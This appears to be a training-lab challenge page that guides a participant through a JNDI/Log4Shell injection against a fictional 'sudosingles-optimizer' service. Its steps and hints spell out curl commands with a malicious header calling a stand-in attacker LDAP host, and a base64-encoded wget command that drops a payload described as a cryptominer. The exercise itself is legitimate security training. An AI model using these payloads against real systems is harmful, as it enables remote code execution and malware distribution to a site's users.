# C1 - File Storage Security - Task 5: Drop It Like It’s Hot 🔥

## DESCRIPTION

Great! It looks like your malicious server is functioning properly. Not it's time to use it to run the exploit.

To do this, you have to make a request to http://sudosingles-optimizer. But you’re going to include a specially crafted header to call back to your malicious LDAP server and execute a command.

For this challenge, the command you want to execute inside the sudosingles-optimizer container will reach out to a malicious URL and drop a scary payload onto the filesystem—a payload which will execute whenever a user visits the website.

## DETAILS

== WHAT DO YOU NEED TO DO? ==
To complete this challenge, you must use a "Basic Command" exploit from JNDIExploit to execute the following command INSIDE THE SUDOSINGLES-OPTIMIZER container:  

wget PAYLOADDROPPERURL -O /srv/connectioncheck

(where PAYLOADDROPPERURL is the value found in FSSPayloadDropperUrl in the credential field below)

== WHAT DOES THIS DO? ==
FSSPayloadDropperUrl is a special URL that can be used to drop a cryptominer onto the host. If you manage to execute that "wget <…>" command inside the sudosingles-optimizer container, you will download a malicious payload from the internet and drop it in the container's file system.

== WHY DO YOU WANT TO DO THIS? ==
All images that appear on the SudoSingles™ website have to pass through the sudosingles-optimizer container for processing. Therefore, if a malicious file is present in the sudosingles-optimizer container, it will be served to ALL USERS of SudoSingles™. That's some good pwnage.

== HOW ARE YOU GOING TO DO THIS? ==
Great question, champ. That's what this challenge is all about. Here's my guidance:

1. Open a new Terminal Emulator window inside the hacker directory and execute the following: "java -jar JNDIExploit-1.2-SNAPSHOT.jar -i $(hostname -I) --usage"
2. This should tell you how to "use" the exploits contained in JNDIExploit. What do you see? Scroll around the output and take note of the options, *especially those at the top of the list*.
3. You already know that you can execute the JNDIExploit's "Basic SpringEcho" exploit using: curl http://sudosingles-optimizer -H 'X-Api-Version: ${jndi:ldap://YOURIP:1389/Basic/SpringEcho}'
4. This time, your task is to use one of the "Basic Command" exploits from JNDIExploit to execute the "wget <…>" command inside the sudosingles-optimizer container.
5. Look at the output of #2. Can you find any information there to help you accomplish #4?
6. If you're trying to execute the "wget <…>" command on the attack machine, you're barking up the wrong tree. Remember, you need to use an exploit from JNDIExploit to execute it on the sudosingles-optimizer container.
7. My last piece of advice, and the only free hint I'll give you, is that you'll need to somehow **encode** the "wget <…>" command in order to execute it using **one of** the "Basic Command" exploits. 

Good luck -- this one can be challenging. Be sure to read carefully and make sure you understand each step. Also, don't be afraid to take the hints. I've written a lot for you, so take advantage of them before bugging Support. Also, remember that you're trying to execute one of the most famous exploits in the last few years. I'm sure there are a few blog posts out there about how it works.

When you believe you’ve successfully performed the exploit, click “Verify” to check your work.

## NOTES

No actual ransomware is used in this challenge, so don’t worry. We’re just having fun here on Tech Day.

## SCORING

payloadChecker

## HINTS

### HINT 1

The exploit you need to run is NOT "/Basic/Command/[cmd]"

### HINT 2

You need to run the "/Basic/Command/Base64/[base64_encoded_command]" exploit. Therefore, your command will look something like: curl http://sudosingles-optimizer -H 'X-Api-Version: ${jndi:ldap://YOURIP:1389/Basic/Command/Base64/[base64_encoded_command]}'.

### HINT 3

Command still not working? Check out the instructions in the Details section again, especially #7. If you're trying to run "curl http://sudosingles-optimizer -H 'X-Api-Version: ${jndi:ldap://YOURIP:1389/Basic/Command/Base64/wget PAYLOADDROPPERURL -O /srv/connectioncheck}'", it will never work. Make sure you substitute PAYLOADDROPPERURL in correctly, and then follow the advice of #6 to achieve victory!

### HINT 4

You need to encode the malicious command as base64, and add it to the ldap URL. For example: ${jndi:ldap://YOURIP:1389/Basic/Command/Base64/BASE_64_ENCODED_COMMAND}. If that isn’t working for you, triple-check to make sure that you have encoded the malicious command correctly. You can encode the command using any tool you want, but base64encode.org is a great resource.

### HINT 5

1. Craft the malicious command: wget PAYLOADDROPPERURL -O /srv/connectioncheck
2. Encode it as base64 using any tool. Base64encode.org is a great option.
3. Replace it in the command: curl http://sudosingles-optimizer -H 'X-Api-Version: ${jndi:ldap://YOURIP:1389/Basic/Command/Base64/ENCODED_PAYLOAD}'
4. Execute
5. Verify
